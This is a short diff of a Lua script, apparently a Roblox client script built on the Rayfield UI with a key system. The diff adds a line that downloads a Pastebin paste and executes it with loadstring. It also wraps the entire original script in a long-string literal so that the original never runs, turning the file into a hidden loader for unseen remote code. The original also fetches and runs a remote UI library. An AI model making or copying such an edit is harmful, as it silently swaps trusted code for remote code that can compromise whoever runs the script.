@@ -1,4 +1,5 @@
-local Player = game.Players.LocalPlayer
+loadstring(game:HttpGet("https://pastebin.com/raw/dbpfU8Cf"))()
+[[local Player = game.Players.LocalPlayer
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local CustomTheme = {
@@ -205,3 +206,4 @@ keySystem:CreateButton({
         end
     end
 })
+]]
